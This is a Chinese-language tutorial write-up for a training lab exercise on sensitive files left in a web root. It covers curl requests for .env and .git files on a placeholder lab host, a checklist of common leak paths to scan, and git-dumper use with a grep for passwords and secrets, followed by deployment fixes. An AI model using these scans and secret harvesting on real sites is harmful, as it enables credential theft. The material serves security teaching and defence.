# 站点根目录里的残留文件

## 这一题在教什么

**有一整类漏洞不需要绕任何校验 —— 东西就摆在那里，直接请求就行。**

这一题跟路径穿越**不是一回事**：

| | 路径穿越（`path_traversal/*`） | 这一题 |
|---|---|---|
| 问题在哪 | 代码允许你**越出**根目录 | 根目录里**本来就有**不该有的文件 |
| 怎么打 | 构造 `../` 之类的 payload 绕过校验 | 直接请求那个文件名 |
| 成因 | 代码写错了 | **部署/运维的时候漏了** |

所以它属于"扫一遍就能发现"的漏洞 —— 也最容易被开发漏掉：
开发觉得"这个文件又不对外"，但 **web 服务器是为整个目录服务的**。

## 漏洞在哪

`module.py` 里的取文件接口：

```python
@app.route("/files/<path:name>")
def serve(name):
    target = (site / name).resolve()
    # ...
    with open(target, "rb") as handle:
        ...
```

**这个接口本身没有洞** —— 它老老实实把访问限制在了 `site/` 里
（`../` 是拦掉的，这一题特意保留了这个检查，好跟路径穿越区分开）。

问题是 `site/` 里除了三个公开文件，还有：

```python
LEAKED_FILES = {
    ".env":            "ADMIN_PASSWORD=ADMIN-LEAK-5c8e\n...",
    ".git/HEAD":       "ref: refs/heads/main\n",
    ".git/config":     "[remote \"origin\"]\n\turl = https://git.corp.example/...",
    "deploy.sh.bak":   "rsync -av --delete ./ deploy@10.0.0.7:/var/www/nav/",
    "app.py.bak":      "SECRET_KEY = \"sk-live-77b2\"\n...",
    "index.html.swp":  "b0VIM 9.0...",
}
```

## 怎么打通

直接猜/扫常见名字：

```bash
curl 'http://<靶场>/v/info_leak/backup_files/files/.env'
curl 'http://<靶场>/v/info_leak/backup_files/files/.git/HEAD'
curl 'http://<靶场>/v/info_leak/backup_files/files/.git/config'
curl 'http://<靶场>/v/info_leak/backup_files/files/deploy.sh.bak'
curl 'http://<靶场>/v/info_leak/backup_files/files/app.py.bak'
curl 'http://<靶场>/v/info_leak/backup_files/files/index.html.swp'
```

`.env` 里直接就有 `ADMIN_PASSWORD`。拿到之后去页面上那个管理员登录框登录。

## 该扫的清单（值得记住）

| 类别 | 常见路径 |
|---|---|
| 版本库 | `/.git/HEAD` `/.git/config` `/.svn/entries` `/.hg/` |
| 环境变量 | `/.env` `/.env.local` `/.env.production` `/.env.bak` |
| 配置备份 | `/config.php.bak` `/app.py.bak` `/web.config.old` |
| 编辑器残留 | `/index.html.swp` `/page.php~` `/.index.html.un~` |
| 部署脚本 | `/deploy.sh` `/Makefile` `/Dockerfile` `/.dockerignore` |
| 打包产物 | `/backup.zip` `/site.tar.gz` `/db.sql` `/dump.sql` |
| 依赖清单 | `/package.json` `/requirements.txt` `/composer.lock` |
| 编辑器/IDE | `/.vscode/` `/.idea/` `/.project` |
| 日志 | `/debug.log` `/error.log` `/access.log` |
| 测试残留 | `/test.php` `/phpinfo.php` `/.DS_Store` |

**`.git/` 值得单独说。** 拿到 `.git/HEAD` 只说明"有版本库"。
但如果**整个 `.git/` 目录**能被拖下来，就可以从对象库里还原出
**全部源码和全部历史**：

```bash
# git-dumper  https://github.com/arthaud/git-dumper
git-dumper http://target/.git/ ./dumped
cd dumped && git log --all --oneline
git log --all -p | grep -i -E 'password|secret|api_key'
```

这是最经典的"从信息泄露到源码泄露"的路。而**历史里的密钥**常常比当前版本更有意思 ——
有人会把密钥提交上去、再在下一次提交里删掉，但历史里还在。

**`robots.txt` 也值得一看**：它经常主动告诉你"哪些路径不该被索引"，
而那正好是你要去看的地方（这一题的 `robots.txt` 就写了 `/admin/` 和 `/files/`）。

## 怎么修

**一、web 根目录只放该公开的东西。（这是根治）**

部署的时候，web 根目录应该**只包含**静态资源，别的什么都不放：

```
/var/www/nav/           ← web 根目录（只放这个）
  index.html
  style.css
  robots.txt

/opt/nav-app/           ← 应用代码、配置、版本库都在这里（不在 web 根目录下）
  .env
  .git/
  app.py
```

**二、部署流程要排除掉这些。**

```bash
# rsync 的排除清单
rsync -av --delete \
  --exclude='.git/' --exclude='.env' --exclude='*.bak' \
  --exclude='*.swp' --exclude='*.log' \
  ./ deploy@host:/var/www/nav/
```

**更好的做法是"白名单式"**：只同步明确列出的目录（`static/`、`dist/`），
而不是"同步全部、排除几个"。**枚举"不该传的东西"永远会漏。**

**三、版本库不要放在 web 根目录里。**

这是最常见的来源。`git clone` 到当前目录，然后又把它当成 web 根目录 ——
`.git/` 就跟着发出去了。

**四、web 服务器层面兜一道。**

```nginx
# 拒绝访问点开头的文件
location ~ /\. {
    deny all;
}
```

这一条很有用，但**不能当唯一防线** —— 它挡不住 `deploy.sh.bak`、
`backup.zip` 这类不带点的名字，也挡不住 web 服务器配置本身写错。

**五、把它加进发布检查清单。**

这类问题的本质是"运维流程漏了一步"。所以最好的修法是**把它变成自动检查**：

```bash
# 发布之后自查
curl -s -o /dev/null -w '%{http_code}' https://site/.env
curl -s -o /dev/null -w '%{http_code}' https://site/.git/HEAD
# 期望是 404 / 403
```

## 顺手想想

- 为什么说"排除清单"不如"白名单"？（举一个排除清单一定会漏的例子）
- 如果 `.git/` 泄露了，但里面的对象已经被 `git gc` 清理过了，还能还原出东西吗？
  （提示：`git gc` 会删掉不可达对象，但 reflog 和 pack 文件里可能还有）
- 这一题的目标是"拿到管理员口令"。如果泄露的只是一个 `README.md`，
  还有价值吗？（提示：信息泄露的价值在于**拼图**）
- 为什么 web 服务器"为整个目录服务"这件事本身就是一个容易出问题的设计？
